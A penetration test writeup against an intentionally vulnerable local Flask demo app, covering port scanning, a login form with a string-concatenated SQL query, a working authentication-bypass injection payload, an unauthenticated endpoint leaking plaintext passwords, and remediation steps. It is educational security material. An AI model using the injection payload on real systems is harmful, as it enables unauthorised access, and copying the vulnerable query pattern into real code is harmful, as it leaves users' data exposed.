# Penetration Test Writeup - Vulnerable Flask Application

## Overview
This writeup documents testing the vulnerable web application in `demo_app/vulnerable_app.py` using tools from this toolkit. The goal is to demonstrate common web vulnerabilities and how to identify them.

## Setup

First, run the vulnerable app:
```bash
cd demo_app
python vulnerable_app.py
```

The app runs on `http://localhost:5000` with a SQLite database.

## Reconnaissance

### Port Scanning
Used the port scanner to identify open ports on localhost:

```bash
go run port_scanner.go -host localhost -start 5000 -end 5100
```

Output:
```
Port 5000: OPEN - http (HTTP/1.1)
  Banner: Werkzeug/2.3.0 Python/3.x
```

The banner grabbing feature identified it's running Flask/Werkzeug - a common Python web framework.

## Vulnerability Discovery

### SQL Injection in Login Form

Tested the login form at `/login` with basic SQL injection payloads.

**Vulnerable Code:**
```python
cursor.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
```

This directly concatenates user input into the SQL query without sanitization.

### Exploitation

**Payload used:**
```
username: admin' OR '1'='1' --
password: anything
```

**What happens:**
The SQL query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'
```

- `OR '1'='1'` is always true
- `--` comments out the rest of the query
- Result: bypasses authentication completely

**Success output:**
```
Login successful! Welcome, admin
```

## Information Disclosure

### Unprotected /users Endpoint

The `/users` endpoint returns all user data in JSON format with no authentication:

```bash
curl http://localhost:5000/users
```

Response:
```json
[
  {"id": 1, "username": "admin", "password": "admin123"},
  {"id": 2, "username": "user", "password": "pass123"}
]
```

Plaintext passwords exposed - huge security issue.

## Additional Vulnerabilities

1. **No CSRF Protection** - Forms can be submitted from external sites
2. **No Rate Limiting** - Brute force attacks possible
3. **Plaintext Password Storage** - Passwords stored without hashing
4. **Debug Mode Enabled** - Stack traces leak information

## Impact

- **Critical**: Complete authentication bypass via SQL injection
- **High**: Full user database disclosure including passwords
- **Medium**: CSRF attacks possible on all forms

## Remediation

1. Use parameterized queries:
   ```python
   cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
   ```

2. Hash passwords with bcrypt/argon2:
   ```python
   hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
   ```

3. Add authentication to sensitive endpoints
4. Implement CSRF tokens
5. Add rate limiting
6. Disable debug mode in production

## Learning Notes

This was intentionally vulnerable for testing purposes. Key takeaways:

- Never trust user input
- Always use parameterized queries
- Hash passwords before storage
- Implement proper access controls
- SQL injection is still one of the most common vulnerabilities (OWASP Top 10)

The port scanner helped identify the service quickly, and banner grabbing confirmed the technology stack before testing began.
